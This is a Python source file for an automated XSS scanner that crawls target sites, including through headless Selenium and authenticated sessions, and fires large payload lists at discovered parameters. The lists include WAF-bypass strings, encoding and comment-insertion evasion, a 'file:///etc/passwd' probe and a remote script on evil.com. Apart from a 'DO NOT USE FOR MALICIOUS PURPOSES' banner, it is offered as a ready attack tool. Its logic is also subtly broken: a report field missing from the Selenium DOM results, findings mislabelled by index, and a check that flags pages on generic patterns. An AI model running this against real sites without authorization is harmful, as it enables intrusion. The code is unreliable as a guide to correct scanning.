#!/usr/bin/env python3
"""
Enhanced XSS Detection Engine - Comprehensive XSS testing with 33x more robustness
"""

import requests
import re
import time
import random
import urllib.parse
from typing import List, Dict, Tuple, Optional
from bs4 import BeautifulSoup
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib

class EnhancedXSSEngine:
    def advanced_crawl_with_selenium(self, url: str, max_depth: int = 2) -> List[str]:
        """Use Selenium headless browser to crawl and discover parameters/forms."""
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        import time as t
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        driver = webdriver.Chrome(options=options)
        visited = set()
        to_visit = [(url, 0)]
        found_params = []
        try:
            while to_visit:
                current_url, depth = to_visit.pop(0)
                if current_url in visited or depth > max_depth:
                    continue
                visited.add(current_url)
                driver.get(current_url)
                t.sleep(1)
                # Find forms and their parameters
                forms = driver.find_elements(By.TAG_NAME, 'form')
                for form in forms:
                    inputs = form.find_elements(By.TAG_NAME, 'input')
                    for input_tag in inputs:
                        name = input_tag.get_attribute('name')
                        if name and name not in found_params:
                            found_params.append(name)
                # Find links to crawl further
                links = driver.find_elements(By.TAG_NAME, 'a')
                for a in links:
                    href = a.get_attribute('href')
                    if href and href.startswith(url):
                        to_visit.append((href, depth+1))
        finally:
            driver.quit()
        return found_params
    def dom_xss_with_selenium(self, url: str, payloads: List[str]) -> List[Dict]:
        """Test DOM XSS using Selenium headless browser."""
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        import time as t
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--disable-gpu')
        options.add_argument('--no-sandbox')
        driver = webdriver.Chrome(options=options)
        dom_vulnerabilities = []
        try:
            for payload in payloads:
                test_url = url + payload
                driver.get(test_url)
                t.sleep(1)
                page_source = driver.page_source
                if payload.replace('#', '') in page_source:
                    dom_vulnerabilities.append({
                        'url': test_url,
                        'type': 'DOM XSS',
                        'payload': payload,
                        'severity': 'High',
                        'evidence': payload
                    })
        finally:
            driver.quit()
        return dom_vulnerabilities
    def set_custom_payloads(self, payloads: List[str]):
        """Set custom payloads for XSS testing."""
        self.custom_payloads = payloads
    def crawl_site(self, url: str, max_depth: int = 2) -> List[str]:
        """Crawl the site to discover more URLs and parameters."""
        visited = set()
        to_visit = [(url, 0)]
        found_params = []
        while to_visit:
            current_url, depth = to_visit.pop(0)
            if current_url in visited or depth > max_depth:
                continue
            visited.add(current_url)
            try:
                resp = self.session.get(current_url, timeout=self.timeout)
                soup = BeautifulSoup(resp.text, 'html.parser')
                # Find forms and their parameters
                for form in soup.find_all('form'):
                    for input_tag in form.find_all('input'):
                        name = input_tag.get('name')
                        if name and name not in found_params:
                            found_params.append(name)
                # Find links to crawl further
                for a in soup.find_all('a', href=True):
                    href = a['href']
                    if href.startswith('/'):
                        next_url = urllib.parse.urljoin(current_url, href)
                        to_visit.append((next_url, depth+1))
            except Exception:
                continue
        return found_params
    def set_auth_cookie(self, cookie: str):
        """Set authentication cookie for session."""
        self.session.headers.update({'Cookie': cookie})
    def __init__(self, max_threads: int = 10, timeout: int = 10):
        self.max_threads = max_threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # XSS Detection patterns
        self.xss_patterns = [
            r'<script[^>]*>.*?</script>',
            r'javascript:',
            r'on\w+\s*=',
            r'<iframe[^>]*>',
            r'<object[^>]*>',
            r'<embed[^>]*>',
            r'<svg[^>]*>',
            r'<img[^>]*onerror',
            r'<body[^>]*onload',
            r'<input[^>]*onfocus',
            r'<details[^>]*ontoggle',
            r'<video[^>]*>',
            r'<audio[^>]*>',
            r'<marquee[^>]*>',
            r'expression\s*\(',
            r'vbscript:',
            r'data:text/html'
        ]
        
        # Context-aware payloads
        self.context_payloads = {
            'html': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")>',
                '<body onload=alert("XSS")>',
                '<input onfocus=alert("XSS") autofocus>',
                '<details open ontoggle=alert("XSS")>',
                '<marquee onstart=alert("XSS")>',
                '<video><source onerror=alert("XSS")>',
                '<audio src=x onerror=alert("XSS")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '\' onmouseover=\'alert("XSS")\'',
                '"><script>alert("XSS")</script>',
                '\';alert("XSS");//',
                '";alert("XSS");//',
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>'
            ],
            'javascript': [
                '\';alert("XSS");//',
                '";alert("XSS");//',
                'alert("XSS")',
                'console.log("XSS")',
                'eval("alert(\\"XSS\\")")',
                'Function("alert(\\"XSS\\")")()',
                'setTimeout("alert(\\"XSS\\")",1)',
                'setInterval("alert(\\"XSS\\")",1)'
            ],
            'url': [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")',
                'file:///etc/passwd',
                'http://evil.com/xss.js'
            ],
            'css': [
                'expression(alert("XSS"))',
                'url(javascript:alert("XSS"))',
                'behavior:url(xss.htc)',
                '@import "javascript:alert(\\"XSS\\")"',
                'background:url(javascript:alert("XSS"))'
            ]
        }
        
        # Advanced evasion techniques
        self.evasion_techniques = {
            'encoding': [
                lambda x: urllib.parse.quote(x),
                lambda x: urllib.parse.quote_plus(x),
                lambda x: x.replace('<', '%3C').replace('>', '%3E'),
                lambda x: x.replace('"', '%22').replace("'", '%27'),
                lambda x: ''.join(f'&#x{ord(c):x};' for c in x),
                lambda x: ''.join(f'&#{ord(c)};' for c in x)
            ],
            'case_variation': [
                lambda x: x.upper(),
                lambda x: x.lower(),
                lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
                lambda x: x.swapcase()
            ],
            'whitespace': [
                lambda x: x.replace(' ', '\t'),
                lambda x: x.replace(' ', '\n'),
                lambda x: x.replace(' ', '\r'),
                lambda x: x.replace(' ', '\f'),
                lambda x: x.replace(' ', '\v'),
                lambda x: re.sub(r'\s+', ' ', x)
            ],
            'comment_insertion': [
                lambda x: x.replace('script', 'scr/**/ipt'),
                lambda x: x.replace('alert', 'ale/**/rt'),
                lambda x: x.replace('javascript', 'java/**/script'),
                lambda x: x.replace('onload', 'on/**/load')
            ]
        }
        
        # WAF bypass techniques
        self.waf_bypasses = [
            '<ScRiPt>alert("XSS")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            '<script>alert`XSS`</script>',
            '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',  # base64: alert("XSS")
            '<svg/onload=alert("XSS")>',
            '<img src=x onerror=alert("XSS")>',
            '<iframe srcdoc="<script>alert(&quot;XSS&quot;)</script>">',
            '<object data="javascript:alert(\'XSS\')">',
            '<embed src="javascript:alert(\'XSS\')">',
            '<form><button formaction="javascript:alert(\'XSS\')">',
            '<input type="image" src="x" onerror="alert(\'XSS\')">',
            '<video><source onerror="alert(\'XSS\')">',
            '<audio src="x" onerror="alert(\'XSS\')">',
            '<details open ontoggle="alert(\'XSS\')">',
            '<marquee onstart="alert(\'XSS\')">',
            '<select onfocus="alert(\'XSS\')" autofocus>',
            '<textarea onfocus="alert(\'XSS\')" autofocus>',
            '<keygen onfocus="alert(\'XSS\')" autofocus>'
        ]
    
    def detect_context(self, response_text: str, payload: str) -> str:
        """Detect the context where the payload appears in the response"""
        if not payload in response_text:
            return 'none'
        
        # Find payload position
        payload_pos = response_text.find(payload)
        context_before = response_text[max(0, payload_pos-100):payload_pos]
        context_after = response_text[payload_pos+len(payload):payload_pos+len(payload)+100]
        
        # Determine context
        if re.search(r'<script[^>]*$', context_before, re.IGNORECASE):
            return 'javascript'
        elif re.search(r'<[^>]*\s+\w+\s*=\s*["\']?$', context_before, re.IGNORECASE):
            return 'attribute'
        elif re.search(r'<style[^>]*$', context_before, re.IGNORECASE):
            return 'css'
        elif 'href=' in context_before or 'src=' in context_before:
            return 'url'
        else:
            return 'html'
    
    def generate_context_payloads(self, context: str, base_payload: str) -> List[str]:
        """Generate context-specific payloads"""
        if context in self.context_payloads:
            return self.context_payloads[context]
        else:
            return [base_payload]
    
    def apply_evasion_techniques(self, payload: str) -> List[str]:
        """Apply various evasion techniques to payload"""
        evaded_payloads = [payload]  # Original payload
        
        for technique_type, techniques in self.evasion_techniques.items():
            for technique in techniques:
                try:
                    evaded = technique(payload)
                    if evaded != payload:
                        evaded_payloads.append(evaded)
                except:
                    continue
        
        return evaded_payloads
    
    def test_single_parameter(self, url: str, param: str, method: str = 'GET') -> List[Dict]:
        """Test a single parameter for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Generate unique identifier for this test
        test_id = hashlib.md5(f"{url}{param}{time.time()}".encode()).hexdigest()[:8]
        
        # Base payloads to test
        base_payloads = [
            f'<script>alert("{test_id}")</script>',
            f'<img src=x onerror=alert("{test_id}")>',
            f'<svg onload=alert("{test_id}")>',
            f'javascript:alert("{test_id}")',
            f'"><script>alert("{test_id}")</script>',
            f'\';alert("{test_id}");//'
        ]
        
        # Add WAF bypass payloads
        base_payloads.extend([p.replace('XSS', test_id) for p in self.waf_bypasses])
        
        for base_payload in base_payloads:
            # Apply evasion techniques
            test_payloads = self.apply_evasion_techniques(base_payload)
            
            for payload in test_payloads:
                try:
                    # Prepare request
                    if method.upper() == 'GET':
                        params = {param: payload}
                        response = self.session.get(url, params=params, timeout=self.timeout)
                    else:
                        data = {param: payload}
                        response = self.session.post(url, data=data, timeout=self.timeout)
                    
                    # Check for XSS
                    if self.is_xss_vulnerable(response.text, payload, test_id):
                        context = self.detect_context(response.text, payload)
                        
                        vulnerability = {
                            'url': response.url,
                            'parameter': param,
                            'payload': payload,
                            'method': method,
                            'context': context,
                            'response_length': len(response.text),
                            'status_code': response.status_code,
                            'test_id': test_id,
                            'severity': self.calculate_severity(context, payload),
                            'evidence': self.extract_evidence(response.text, payload)
                        }
                        
                        vulnerabilities.append(vulnerability)
                        break  # Found vulnerability, no need to test more payloads for this param
                
                except requests.RequestException:
                    continue
                except Exception:
                    continue
                
                # Rate limiting
                time.sleep(0.1)
        
        return vulnerabilities
    
    def is_xss_vulnerable(self, response_text: str, payload: str, test_id: str) -> bool:
        """Check if response indicates XSS vulnerability"""
        # Check if payload is reflected
        if payload not in response_text and test_id not in response_text:
            return False
        
        # Check for dangerous patterns
        for pattern in self.xss_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        # Check if test_id appears in executable context
        dangerous_contexts = [
            f'<script[^>]*>{test_id}',
            f'javascript:[^"\']*{test_id}',
            rf'on\w+\s*=[^>]*{test_id}',
            f'<iframe[^>]*{test_id}',
            f'<object[^>]*{test_id}',
            f'<embed[^>]*{test_id}'
        ]
        
        for context in dangerous_contexts:
            if re.search(context, response_text, re.IGNORECASE):
                return True
        
        return False
    
    def calculate_severity(self, context: str, payload: str) -> str:
        """Calculate vulnerability severity based on context and payload"""
        if context == 'javascript':
            return 'Critical'
        elif context == 'html' and '<script>' in payload:
            return 'High'
        elif context == 'attribute' and 'javascript:' in payload:
            return 'High'
        elif context == 'html':
            return 'Medium'
        elif context == 'attribute':
            return 'Medium'
        else:
            return 'Low'
    
    def extract_evidence(self, response_text: str, payload: str) -> str:
        """Extract evidence of XSS vulnerability"""
        if payload not in response_text:
            return "Payload not found in response"
        
        payload_pos = response_text.find(payload)
        start = max(0, payload_pos - 100)
        end = min(len(response_text), payload_pos + len(payload) + 100)
        
        evidence = response_text[start:end]
        return evidence.replace('\n', '\\n').replace('\r', '\\r')
    
    def test_dom_xss(self, url: str) -> List[Dict]:
        """Test for DOM-based XSS vulnerabilities"""
        dom_vulnerabilities = []
        
        # DOM XSS test payloads
        dom_payloads = [
            '#<script>alert("DOM-XSS")</script>',
            '#"><script>alert("DOM-XSS")</script>',
            '#javascript:alert("DOM-XSS")',
            '#<img src=x onerror=alert("DOM-XSS")>',
            '#<svg onload=alert("DOM-XSS")>'
        ]
        
        for payload in dom_payloads:
            try:
                test_url = url + payload
                response = self.session.get(test_url, timeout=self.timeout)
                
                # Check for DOM XSS patterns
                dom_patterns = [
                    r'document\.location',
                    r'window\.location',
                    r'location\.hash',
                    r'location\.search',
                    r'document\.URL',
                    r'document\.referrer',
                    r'window\.name',
                    r'history\.pushState',
                    r'history\.replaceState'
                ]
                
                for pattern in dom_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        # Check if payload could be executed
                        if payload.replace('#', '') in response.text:
                            vulnerability = {
                                'url': test_url,
                                'type': 'DOM XSS',
                                'payload': payload,
                                'pattern': pattern,
                                'severity': 'High',
                                'evidence': self.extract_evidence(response.text, payload.replace('#', ''))
                            }
                            dom_vulnerabilities.append(vulnerability)
                            break
            
            except requests.RequestException:
                continue
        
        return dom_vulnerabilities
    
    def comprehensive_xss_scan(self, url: str, parameters: List[str], 
                             methods: List[str] = ['GET', 'POST'], progress_callback=None) -> Dict:
        """Comprehensive XSS scanning with threading and real-time progress callback"""
        results = {
            'url': url,
            'total_parameters': len(parameters),
            'vulnerabilities': [],
            'dom_vulnerabilities': [],
            'scan_time': 0,
            'errors': []
        }

        start_time = time.time()

        try:
            # Advanced crawling with Selenium
            crawled_params = self.advanced_crawl_with_selenium(url)
            for p in crawled_params:
                if p not in parameters:
                    parameters.append(p)
            # Test DOM XSS with Selenium
            print(f"🔍 Testing DOM XSS for {url} (Selenium)")
            dom_payloads = [
                '#<script>alert("DOM-XSS")</script>',
                '#"><script>alert("DOM-XSS")</script>',
                '#javascript:alert("DOM-XSS")',
                '#<img src=x onerror=alert("DOM-XSS")>',
                '#<svg onload=alert("DOM-XSS")>'
            ]
            results['dom_vulnerabilities'] = self.dom_xss_with_selenium(url, dom_payloads)

            # Use custom payloads if set
            payloads = getattr(self, 'custom_payloads', None)
            # Test parameters with threading
            total_tests = len(parameters) * len(methods)
            done = 0
            findings = 0
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                futures = []
                param_method_map = []
                for param in parameters:
                    for method in methods:
                        if payloads:
                            futures.append(executor.submit(self.test_single_parameter_with_payloads, url, param, method, payloads))
                        else:
                            futures.append(executor.submit(self.test_single_parameter, url, param, method))
                        param_method_map.append((param, method))

                for i, future in enumerate(as_completed(futures)):
                    param, method = param_method_map[i]
                    error_count = len(results['errors'])
                    try:
                        param_results = future.result()
                        results['vulnerabilities'].extend(param_results)
                        findings += len(param_results)
                    except Exception as e:
                        results['errors'].append(str(e))
                        error_count = len(results['errors'])
                    done += 1
                    if progress_callback:
                        progress_callback(done, findings, error_count, param, method)

        except Exception as e:
            results['errors'].append(f"Scan failed: {str(e)}")

        results['scan_time'] = time.time() - start_time
        return results
    def test_single_parameter_with_payloads(self, url: str, param: str, method: str, payloads: List[str]) -> List[Dict]:
        """Test a single parameter for XSS vulnerabilities using custom payloads."""
        vulnerabilities = []
        test_id = hashlib.md5(f"{url}{param}{time.time()}".encode()).hexdigest()[:8]
        for payload in payloads:
            try:
                if method.upper() == 'GET':
                    params = {param: payload}
                    response = self.session.get(url, params=params, timeout=self.timeout)
                else:
                    data = {param: payload}
                    response = self.session.post(url, data=data, timeout=self.timeout)
                if self.is_xss_vulnerable(response.text, payload, test_id):
                    context = self.detect_context(response.text, payload)
                    vulnerability = {
                        'url': response.url,
                        'parameter': param,
                        'payload': payload,
                        'method': method,
                        'context': context,
                        'response_length': len(response.text),
                        'status_code': response.status_code,
                        'test_id': test_id,
                        'severity': self.calculate_severity(context, payload),
                        'evidence': self.extract_evidence(response.text, payload)
                    }
                    vulnerabilities.append(vulnerability)
                    break
            except requests.RequestException:
                continue
            except Exception:
                continue
            time.sleep(0.1)
        return vulnerabilities
    
    def generate_xss_report(self, scan_results: Dict) -> str:
        """Generate detailed XSS vulnerability report"""
        report = []
        report.append("=" * 60)
        report.append("XSS VULNERABILITY SCAN REPORT")
        report.append("=" * 60)
        report.append(f"Target URL: {scan_results['url']}")
        report.append(f"Parameters Tested: {scan_results['total_parameters']}")
        report.append(f"Scan Duration: {scan_results['scan_time']:.2f} seconds")
        report.append(f"Vulnerabilities Found: {len(scan_results['vulnerabilities'])}")
        report.append(f"DOM XSS Found: {len(scan_results['dom_vulnerabilities'])}")
        report.append("")
        
        # Regular XSS vulnerabilities
        if scan_results['vulnerabilities']:
            report.append("REFLECTED/STORED XSS VULNERABILITIES:")
            report.append("-" * 40)
            
            for i, vuln in enumerate(scan_results['vulnerabilities'], 1):
                report.append(f"{i}. Parameter: {vuln['parameter']}")
                report.append(f"   Method: {vuln['method']}")
                report.append(f"   Context: {vuln['context']}")
                report.append(f"   Severity: {vuln['severity']}")
                report.append(f"   Payload: {vuln['payload']}")
                report.append(f"   Evidence: {vuln['evidence'][:100]}...")
                report.append("")
        
        # DOM XSS vulnerabilities
        if scan_results['dom_vulnerabilities']:
            report.append("DOM XSS VULNERABILITIES:")
            report.append("-" * 25)
            
            for i, vuln in enumerate(scan_results['dom_vulnerabilities'], 1):
                report.append(f"{i}. Type: {vuln['type']}")
                report.append(f"   Pattern: {vuln['pattern']}")
                report.append(f"   Severity: {vuln['severity']}")
                report.append(f"   Payload: {vuln['payload']}")
                report.append(f"   Evidence: {vuln['evidence'][:100]}...")
                report.append("")
        
        # Errors
        if scan_results['errors']:
            report.append("ERRORS ENCOUNTERED:")
            report.append("-" * 20)
            for error in scan_results['errors']:
                report.append(f"- {error}")
            report.append("")
        
        report.append("=" * 60)
        report.append("EDUCATIONAL USE ONLY - DO NOT USE FOR MALICIOUS PURPOSES")
        report.append("=" * 60)
        
        return "\n".join(report)

# Example usage
if __name__ == "__main__":
    # Educational demonstration
    xss_engine = EnhancedXSSEngine(max_threads=5)
    
    # Example parameters to test
    test_params = ['search', 'q', 'query', 'name', 'comment', 'message']
    
    print("🚀 Enhanced XSS Engine - Educational Use Only")
    print("=" * 50)
    print("This tool is for educational and authorized testing only!")
    print("=" * 50)